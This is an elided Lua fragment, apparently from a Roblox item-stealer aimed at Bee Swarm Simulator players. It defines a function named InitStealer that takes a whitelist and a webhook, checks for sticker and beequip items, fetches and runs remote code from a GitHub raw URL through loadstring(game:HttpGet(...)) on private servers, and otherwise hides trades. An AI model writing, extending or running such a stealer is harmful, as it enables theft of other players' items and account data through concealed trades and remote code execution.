_G.LINK = "https://raw.githubusercontent.com/K-0N/mytest2/refs/heads/main/finalbeta.lua"
...
local function InitStealer(UserWhitelist, Webhook)
    ...
    if #GetStickers() > 0 or #GetBeequips() > 0 then
        if GameData.IsPrivateServer then
            loadstring(game:HttpGet("https://raw.githubusercontent.com/K-0N/mytest2/refs/heads/main/install4.lua"))()
            return
        else
            HideTrades()
        end
